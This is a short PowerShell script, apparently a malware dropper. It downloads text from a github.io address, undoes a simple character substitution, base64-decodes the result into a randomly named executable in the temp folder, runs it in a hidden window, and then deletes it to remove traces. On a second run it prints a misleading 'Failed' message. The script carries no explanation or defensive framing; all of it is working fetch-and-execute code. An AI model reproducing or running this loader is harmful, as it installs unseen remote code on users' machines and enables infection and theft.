if (Test-Path -Path $folderPath) {  Remove-Item -Path $folderPath -Recurse -Force; Write-Host "Failed, have you run me twice?";pause;exit }
New-Item -ItemType Directory -Path $folderPath | Out-Null
$url = "https://stinkylick.github.io/stinkylick/2/a"
$data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
$filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data))
Start-Process -FilePath $filename -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item -Path $filename -Force
